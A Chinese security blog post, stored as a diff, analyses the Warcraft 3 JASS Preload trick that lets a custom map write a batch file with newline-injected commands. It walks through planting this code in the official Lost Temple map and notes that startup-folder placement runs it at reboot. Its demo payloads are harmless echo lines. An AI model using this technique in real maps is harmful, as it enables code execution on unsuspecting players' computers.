@@ -1,0 +1,351 @@
+I"�7<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+<p>最近腾讯电脑管家团队对利用《魔兽争霸3》漏洞传播的“萝莉”蠕虫进行了分析，介绍了“萝莉”蠕虫的运行流程。接着该“蠕虫”的作者在其网站对此做了澄清，我们暂且不八卦这个事件，只在技术层面分析一下这个《魔兽争霸3》漏洞到底是什么，如何利用以及如何防御。</p>
+
+<p><strong>“萝莉”蠕虫分析地址：</strong>
+http://www.freebuf.com/news/120136.html</p>
+
+<p><strong>“蠕虫”的作者博客地址：</strong>
+https://blog.loxve.com/</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>该《魔兽争霸3》漏洞的流程如下：</p>
+
+<p>1.攻击者上传修改过的魔兽地图，等待其他玩家进入房间游戏</p>
+
+<p>2.玩家进入房间后，由于本地没有该地图，所以会自动下载该地图</p>
+
+<p>3.地图同步后，玩家进入游戏，触发地图中的脚本，该脚本在启动目录写入bat文件</p>
+
+<p>4.玩家电脑重启后，启动目录中的bat文件被执行，成功加载payload</p>
+
+<h2 id="0x02-相关概念">0x02 相关概念</h2>
+<hr />
+
+<h3 id="jass">JASS</h3>
+
+<p>是《魔兽争霸3》的脚本语言，用于控制地图的进程和行为, 是魔兽游戏和地图的基础</p>
+
+<p>正常的地图编辑中摆放的单位(Unit), 设置的触发(Trigger)等最终都会被翻译成JASS语言，保存在地图文件中，在游戏运行时被调用</p>
+
+<h3 id="hkew3mmodifier">HkeW3mModifier</h3>
+
+<p>是一个修改MPQ格式文件的工具，可用来修改加密过的mpq文件，带有强大的资源搜索功能，可以搜索出魔兽地图中大部分资源、重建列表，智能解压相关贴图</p>
+
+<p>可用来查看和编辑地图中包含的文件资源</p>
+
+<p><strong>操作说明：</strong></p>
+
+<p>下载HkeW3mModifier.exe，选择地图，点击分析文件查看地图中包含的文件列表，如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/1-1.png" alt="Alt text" /></p>
+
+<p>其中，war3map.j包含地图的逻辑控制代码，右键解压war3map.j后可查看其中的代码，部分代码如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/1-2.png" alt="Alt text" /></p>
+
+<h3 id="war3mapj中的文件结构">war3map.j中的文件结构</h3>
+
+<p>1、变量声明</p>
+
+<p>声明了脚本文件中使用的全局变量
+Lost Temple中的变量声明如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//***************************************************************************
+//*
+//*  Global Variables
+//*
+//***************************************************************************
+
+globals
+    // Generated
+    trigger                 gg_trg_Melee_Initialization = null
+endglobals
+
+function InitGlobals takes nothing returns nothing
+endfunction
+</code></pre></div></div>
+
+<p>2、触发器部分</p>
+
+<p>声明了地图中使用的触发器</p>
+
+<p>Lost Temple中的触发器部分如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//***************************************************************************
+//*
+//*  Triggers
+//*
+//***************************************************************************
+
+//===========================================================================
+// Trigger: Melee Initialization
+//
+// Default melee game initialization for all players
+//===========================================================================
+function Trig_Melee_Initialization_Actions takes nothing returns nothing
+    call MeleeStartingVisibility(  )
+    call MeleeStartingHeroLimit(  )
+    call MeleeGrantHeroItems(  )
+    call MeleeStartingResources(  )
+    call MeleeClearExcessUnits(  )
+    call MeleeStartingUnits(  )
+    call MeleeStartingAI(  )
+    call MeleeInitVictoryDefeat(  )
+endfunction
+
+//===========================================================================
+function InitTrig_Melee_Initialization takes nothing returns nothing
+    set gg_trg_Melee_Initialization = CreateTrigger(  )
+    call TriggerAddAction( gg_trg_Melee_Initialization, function Trig_Melee_Initialization_Actions )
+endfunction
+
+//===========================================================================
+function InitCustomTriggers takes nothing returns nothing
+    call InitTrig_Melee_Initialization(  )
+endfunction
+
+//===========================================================================
+function RunInitializationTriggers takes nothing returns nothing
+    call ConditionalTriggerExecute( gg_trg_Melee_Initialization )
+endfunction
+</code></pre></div></div>
+
+<p>根据函数名称能够猜出表示的意思</p>
+
+<p>function Trig_Melee_Initialization_Actions为触发器进行的操作</p>
+
+<p>function InitTrig_Melee_Initialization用来初始化</p>
+
+<p>function InitCustomTriggers为用户自定义触发器的注册</p>
+
+<p>function RunInitializationTriggers的功能是运行触发器</p>
+
+<p>3、主函数main</p>
+
+<p>脚本文件的入口</p>
+
+<p>Lost Temple中的main部分如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//***************************************************************************
+//*
+//*  Main Initialization
+//*
+//***************************************************************************
+
+//===========================================================================
+function main takes nothing returns nothing
+    call SetCameraBounds( -7936.0 + GetCameraMargin(CAMERA_MARGIN_LEFT), -8192.0 + GetCameraMargin(CAMERA_MARGIN_BOTTOM), 7936.0 - GetCameraMargin(CAMERA_MARGIN_RIGHT), 7680.0 - GetCameraMargin(CAMERA_MARGIN_TOP), -7936.0 + GetCameraMargin(CAMERA_MARGIN_LEFT), 7680.0 - GetCameraMargin(CAMERA_MARGIN_TOP), 7936.0 - GetCameraMargin(CAMERA_MARGIN_RIGHT), -8192.0 + GetCameraMargin(CAMERA_MARGIN_BOTTOM) )
+    call SetDayNightModels( "Environment\\DNC\\DNCLordaeron\\DNCLordaeronTerrain\\DNCLordaeronTerrain.mdl", "Environment\\DNC\\DNCLordaeron\\DNCLordaeronUnit\\DNCLordaeronUnit.mdl" )
+    call NewSoundEnvironment( "Default" )
+    call SetAmbientDaySound( "LordaeronSummerDay" )
+    call SetAmbientNightSound( "LordaeronSummerNight" )
+    call SetMapMusic( "Music", true, 0 )
+    call CreateAllUnits(  )
+    call InitBlizzard(  )
+    call InitGlobals(  )
+    call InitCustomTriggers(  )
+    call RunInitializationTriggers(  )
+
+endfunction
+</code></pre></div></div>
+
+<p>4、其他设置</p>
+
+<p>如Unit Item Tables、Unit Creation、Players、Map Configuration暂略</p>
+
+<h2 id="0x03-jass预读文件漏洞">0x03 Jass预读文件漏洞</h2>
+<hr />
+
+<p><strong>Reference:</strong></p>
+
+<p>http://bbs.islga.org/forum.php?mod=viewthread&amp;tid=48422&amp;extra=page%3D1&amp;page=1</p>
+
+<p>JASS中三个特殊的函数：</p>
+
+<ul>
+  <li>native PreloadGenClear  takes nothing returns nothing</li>
+  <li>native PreloadGenStart  takes nothing returns nothing</li>
+  <li>native PreloadGenEnd    takes string filename returns nothing</li>
+</ul>
+
+<p>以上三个函数用来记录PreloadGenStart()和PreloadGenEnd()之间执行的所有Preload()语句，并将它们写入到PreloadGenEnd()函数指定的pld文件里去</p>
+
+<p><strong>注：</strong></p>
+
+<p>类似于输出日志文件</p>
+
+<p><strong>示例：</strong></p>
+
+<p>JASS代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Test takes nothing returns nothing
+    call PreloadGenClear()
+    call PreloadGenStart()
+    call Preload( "ReplaceableTextures \\CameraMasks\\White_mask.blp" )
+    call PreloadGenEnd("c:\\test\\test.pld")
+endfunction
+</code></pre></div></div>
+
+<p>执行函数Test()后，就会在c:\test\下新建文件test.pld，并写入如下内容：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Test takes nothing returns nothing
+    call Preload( "ReplaceableTextures \\CameraMasks\\White_mask.blp" )
+    call PreloadEnd( 0.0 )
+endfunction
+</code></pre></div></div>
+
+<h3 id="漏洞原理">漏洞原理</h3>
+
+<h3 id="1设置输出为bat文件">1、设置输出为bat文件</h3>
+
+<p>如果将输出的.pld文件后缀名改为.bat，那么文件中的每一行被当作一段代码被执行（当然语句无效，不符合批处理的语法），如图
+<img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/2-1.png" alt="Alt text" /></p>
+
+<h3 id="2加入换行符n">2、加入换行符\n</h3>
+<p>在批处理的语法中，\n代表换行。虽然.pld文件输出的每行内容格式固定，但是，如果通过<code class="language-plaintext highlighter-rouge">\n</code>把call Preload()这一行中的内容截断，那么就能够实现在新的一行显示一条可被执行的批处理命令</p>
+
+<p><strong>示例：</strong></p>
+
+<p>JASS代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Test takes nothing returns nothing
+    call PreloadGenClear()
+    call PreloadGenStart()
+    call Preload("\n@echo Test\n")
+    call PreloadGenEnd("c:\\test\\test.bat")
+endfunction
+</code></pre></div></div>
+
+<p>输出成test.bat后会包含换行符，输出的文件内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Test takes nothing returns nothing
+    call Preload( "
+@echo Test
+" )
+    call PreloadEnd( 0.0 )
+endfunction
+</code></pre></div></div>
+
+<p>此时，产生了新的一行代码<code class="language-plaintext highlighter-rouge">@echo Test</code>，<code class="language-plaintext highlighter-rouge">@echo Test</code>得到执行，如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/2-2.png" alt="Alt text" /></p>
+
+<h3 id="3执行批处理">3、执行批处理</h3>
+
+<p>默认JASS只能做到输出文件，无法执行文件，所以只能将文件输出到文件启动项下，在重启后得到执行</p>
+
+<h2 id="0x04-实际测试">0x04 实际测试</h2>
+<hr />
+
+<h3 id="1测试helloga2012w3m">1、测试HelloGA2012.w3m</h3>
+
+<p><strong>下载地址：</strong></p>
+
+<p>http://bbs.islga.org/forum.php?mod=viewthread&amp;tid=48422&amp;extra=page%3D1&amp;page=1中的附件</p>
+
+<p>war3版本：1.27.0.52240</p>
+
+<p>加载地图HelloGA2012进入游戏后，按Esc键，如图，弹出提示，在D:\XX\下产生文件test.pld</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/3-1.png" alt="Alt text" />
+跳到目录D:\XX\，找到test.pld，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function PreloadFiles takes nothing returns nothing
+
+  call Preload( "
+@cls
+@color a
+@echo Hello World
+@echo This is a sample of WC3 map generated BAT file.
+@echo Welcome to http://bbs.islga.org. Let's go 2012 with GA!
+@pause
+@exit
+" )
+  call PreloadEnd( 0.0 )
+
+endfunction
+</code></pre></div></div>
+
+<p>测试成功</p>
+
+<h3 id="2手动修改官方地图losttemple">2、手动修改官方地图LostTemple</h3>
+
+<p>(1) 获得源文件</p>
+
+<p>使用HkeW3mModifier打开官方地图<code class="language-plaintext highlighter-rouge">(4)LostTemple.w3m</code>，导出war3map.j</p>
+
+<p>(2) 添加payload</p>
+
+<p>根据上文对war3map.j中文件结构的分析，在<code class="language-plaintext highlighter-rouge">function Trig_Melee_Initialization_Actions</code>内添加如下代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>call PreloadGenClear()
+call PreloadGenStart()
+call Preload("\n@echo Test\n")
+call PreloadGenEnd("c:\\test\\test.bat")
+</code></pre></div></div>
+
+<p>如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/3-2.png" alt="Alt text" /></p>
+
+<p>(3) 保存</p>
+
+<p>保存war3map.j后，在HkeW3mModifier选择替换(添加)文件，如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/3-3.png" alt="Alt text" /></p>
+
+<p>选择重压缩，保存地图文件，如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/3-4.png" alt="Alt text" /></p>
+
+<p>(4) 测试</p>
+
+<p>将地图置于Maps文件夹下，进入游戏，地图被识别，如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-22/4-1.png" alt="Alt text" /></p>
+
+<p><strong>注：</strong>
+为便于测试，已将地图名称修改为Test；覆盖原地图，迷惑性更大</p>
+
+<p>开始游戏，c:\test\下产生文件test.bat，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function PreloadFiles takes nothing returns nothing
+
+  call Preload( "
+@echo Test
+" )
+  call PreloadEnd( 0.0 )
+
+endfunction
+</code></pre></div></div>
+<p>如果将该文件输出到开机自启动目录，那么在重启后，文件将会执行</p>
+
+<p>测试成功</p>
+
+<h2 id="0x05-补充">0x05 补充</h2>
+<hr />
+
+<p>1、这个漏洞本身并不包含代码执行的功能，所以漏洞成功利用的关键在于找到一个执行代码的方法，最直接的方式为将文件输出到启动项中，当然，也可利用该漏洞实现对指定文件的修改</p>
+
+<p>2、dota地图中war3map.j的位置为scripts\war3map.j,同样可以利用</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>严格意义来讲，这个《魔兽争霸3》漏洞并不是一个漏洞，只是war3地图中支持一个输出文件的正常功能，利用这个功能，将精心构造的代码输出到特定位置，再配合其他方式来执行它。</p>
+
+<p>所以该漏洞利用的关键在于执行的方式，通用方法无非就是写开机启动项。</p>
+
+<p>对于普通用户来讲，注意本机的开机启动项目录就好，同时，杀毒软件也已经能够检测到该利用方式。</p>
+
+<p>注意自我保护，谨防受骗上当。</p>
+
+<p>适度游戏益脑，沉迷游戏伤身。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+:ET
